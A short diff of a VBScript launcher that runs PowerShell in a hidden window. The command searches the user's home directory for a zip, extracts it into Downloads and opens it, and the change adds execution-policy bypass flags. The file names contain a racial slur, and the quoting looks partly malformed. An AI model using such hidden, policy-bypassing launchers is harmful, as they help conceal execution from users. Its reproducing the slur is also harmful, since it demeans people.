@@ -1,3 +1,3 @@
 Set oshell = wscript.createobject("wscript.shell")
-oshell.run "powershell.exe -NoExit -command ""& {$lookfile = get-childitem -path ~\* -recurse -include *bitchynigga.zip -erroraction silentlycontinue ; $foundfile = test-path $lookfile ; If ($foundfile -eq $True) {"" $lookfile | Expand-Archive -destinationpath ""~\downloads\bitchynigga"" -force; ii ""~\downloads\bitchynigga"" ""} Else {""notepad.exe""}}""", 0, True
+oshell.run "powershell.exe -nop -exec bypass -command ""& {$lookfile = get-childitem -path ~\* -recurse -include *bitchynigga.zip -erroraction silentlycontinue ; $foundfile = test-path $lookfile ; If ($foundfile -eq $True) {"" $lookfile | Expand-Archive -destinationpath ""~\downloads\bitchynigga"" -force; ii ""~\downloads\bitchynigga"" ""} Else {""notepad.exe""}}""", 0, True
 
